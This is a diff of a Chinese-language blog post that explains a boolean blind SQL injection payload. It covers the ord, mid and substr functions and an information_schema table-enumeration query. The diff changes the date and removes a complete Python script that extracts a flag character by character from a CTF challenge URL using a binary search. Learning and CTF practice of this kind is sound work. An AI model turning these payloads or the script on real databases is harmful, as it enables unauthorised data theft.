@@ -20,19 +20,19 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="布尔盲注payload拆解分析重点函数ord() 转换成ASCII码 mid(string，n，1) AND substr(string，n，1) 截取字符串第n位 left(sting，n) 截取字符串的前n位 示例异或 12345678[&#96;查表&#96;]1^(ord(substr((select(group_concat(table_name))from(information_schema.tab">
+  <meta name="description" content="布尔盲注payload拆解分析学习的时候为了理解写的小水文，如果写的不好，望理解，嘿嘿~🤭 重点函数ord() 转换成ASCII码 mid(string，n，1) AND substr(string，n，1) 截取字符串第n位 left(sting，n) 截取字符串的前n位 示例异或 12345678[&#96;查表&#96;]1^(ord(substr((select(group_concat(table_n">
 <meta property="og:type" content="article">
 <meta property="og:title" content="布尔盲注某payload拆解分析">
-<meta property="og:url" content="http://example.com/2021/11/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/index.html">
+<meta property="og:url" content="http://example.com/2021/12/29/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="JJhome">
-<meta property="og:description" content="布尔盲注payload拆解分析重点函数ord() 转换成ASCII码 mid(string，n，1) AND substr(string，n，1) 截取字符串第n位 left(sting，n) 截取字符串的前n位 示例异或 12345678[&#96;查表&#96;]1^(ord(substr((select(group_concat(table_name))from(information_schema.tab">
+<meta property="og:description" content="布尔盲注payload拆解分析学习的时候为了理解写的小水文，如果写的不好，望理解，嘿嘿~🤭 重点函数ord() 转换成ASCII码 mid(string，n，1) AND substr(string，n，1) 截取字符串第n位 left(sting，n) 截取字符串的前n位 示例异或 12345678[&#96;查表&#96;]1^(ord(substr((select(group_concat(table_n">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-11-19T07:05:00.000Z">
-<meta property="article:modified_time" content="2021-11-19T07:05:00.000Z">
+<meta property="article:published_time" content="2021-12-29T07:05:00.000Z">
+<meta property="article:modified_time" content="2021-12-29T07:05:00.000Z">
 <meta property="article:author" content="UknowJJ">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2021/11/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/">
+<link rel="canonical" href="http://example.com/2021/12/29/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/">
 
 
 <script id="page-configurations">
@@ -150,7 +150,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/29/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -173,7 +173,7 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2021-11-19 15:05:00" itemprop="dateCreated datePublished" datetime="2021-11-19T15:05:00+08:00">2021-11-19</time>
+              <time title="Created: 2021-12-29 15:05:00" itemprop="dateCreated datePublished" datetime="2021-12-29T15:05:00+08:00">2021-12-29</time>
             </span>
 
           
@@ -187,7 +187,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="布尔盲注payload拆解分析"><a href="#布尔盲注payload拆解分析" class="headerlink" title="布尔盲注payload拆解分析"></a>布尔盲注payload拆解分析</h1><h3 id="重点函数"><a href="#重点函数" class="headerlink" title="重点函数"></a>重点函数</h3><p><code>ord()</code> 转换成ASCII码</p>
+        <h1 id="布尔盲注payload拆解分析"><a href="#布尔盲注payload拆解分析" class="headerlink" title="布尔盲注payload拆解分析"></a>布尔盲注payload拆解分析</h1><p>学习的时候为了理解写的小水文，如果写的不好，望理解，嘿嘿~🤭</p>
+<h3 id="重点函数"><a href="#重点函数" class="headerlink" title="重点函数"></a>重点函数</h3><p><code>ord()</code> 转换成ASCII码</p>
 <p><code>mid(string，n，1)</code> AND <code>substr(string，n，1)</code> 截取字符串第n位</p>
 <p><code>left(sting，n)</code> 截取字符串的前n位</p>
 <h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>异或</p>
@@ -201,13 +202,7 @@
 <h3 id="语句分析"><a href="#语句分析" class="headerlink" title="语句分析"></a>语句分析</h3><p><code>table_name</code> 是表名</p>
 <p><code>table_schema</code> 是库名</p>
 <p><code>information_shcema</code>  可看作为数据库名，表明，数据类型，权限等这些的数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查表：select(group_concat(table_name))from(information_shcema.tables)where(table_schema=databases())</span><br><span class="line">返回ASCII码：ord(mid(SQL语句查询的表名))</span><br></pre></td></tr></table></figure>
-
-<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>&#96;&#96;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def payload(url, i, mid): # 猜解单个字段值</span><br><span class="line">    payload = &quot;1^(ord(substr((select(group_concat(value))from(flag)), %d,1))&gt;=%s)^1&quot;%(i,mid)</span><br><span class="line">    payload_url = url + payload</span><br><span class="line">    # time.sleep(1)</span><br><span class="line">    print(payload)</span><br><span class="line">    resp = requests.get(payload_url)</span><br><span class="line">    # 如果能够执行下列语句 则代表着 大于或等于</span><br><span class="line">    if &quot;admin&quot; in resp.text:</span><br><span class="line">        # 再次进行判断</span><br><span class="line">        payload = &quot;1^(ord(substr((select(group_concat(value))from(flag)), %d,1))=%s)^1&quot;%(i,mid)</span><br><span class="line">        payload_url = url + payload</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        print(payload)</span><br><span class="line">        resp = requests.get(payload_url)</span><br><span class="line">        if &quot;admin&quot; in resp.text:</span><br><span class="line">        # 拿到目标数</span><br><span class="line">            return 200</span><br><span class="line">        else:</span><br><span class="line">            # 小于目标值</span><br><span class="line">            return 203</span><br><span class="line">    # 大于目标值</span><br><span class="line">    else:</span><br><span class="line">        return 400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp(url):</span><br><span class="line">    column_value = &quot;&quot;</span><br><span class="line">    for i in range(1,300):</span><br><span class="line">        start = 33</span><br><span class="line">        end = 127</span><br><span class="line">        while start &lt;= end:</span><br><span class="line">            mid = (start + end) // 2</span><br><span class="line">            res = payload(url,i,mid)</span><br><span class="line">            print(&quot;[*] 返回码：&quot; + str(res))</span><br><span class="line">            # 代表找到</span><br><span class="line">            if res == 200:</span><br><span class="line">                print(&quot;[+] mid = &quot;+str(mid))</span><br><span class="line">                column_value += chr(mid)</span><br><span class="line">                break</span><br><span class="line">            # 代表是小于字符ascii码值</span><br><span class="line">            elif res == 203:</span><br><span class="line">                start = mid + 1 </span><br><span class="line">            # 代表是大于 ascii码值</span><br><span class="line">            elif res == 400:</span><br><span class="line">                end = mid - 1</span><br><span class="line">        print(&quot;[+] &quot; + column_value)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    url = &quot;http://2881a64e-02bf-4c71-b948-26b1a1e6c0ae.node3.buuoj.cn/?stunum=&quot;</span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure>
-
-
-
+<p>查表：<code>select(group_concat(table_name))from(information_shcema.tables)where(table_schema=databases())</code><br>返回ASCII码：<code>ord(mid(SQL语句查询的表名))</code></p>
 
     </div>
 
@@ -285,7 +280,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">布尔盲注payload拆解分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E7%82%B9%E5%87%BD%E6%95%B0"><span class="nav-number">1.0.1.</span> <span class="nav-text">重点函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.0.2.</span> <span class="nav-text">示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-number">1.0.3.</span> <span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E5%8F%A5%E5%88%86%E6%9E%90"><span class="nav-number">1.0.4.</span> <span class="nav-text">语句分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">1.0.5.</span> <span class="nav-text">脚本</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">布尔盲注payload拆解分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E7%82%B9%E5%87%BD%E6%95%B0"><span class="nav-number">1.0.1.</span> <span class="nav-text">重点函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.0.2.</span> <span class="nav-text">示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-number">1.0.3.</span> <span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E5%8F%A5%E5%88%86%E6%9E%90"><span class="nav-number">1.0.4.</span> <span class="nav-text">语句分析</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
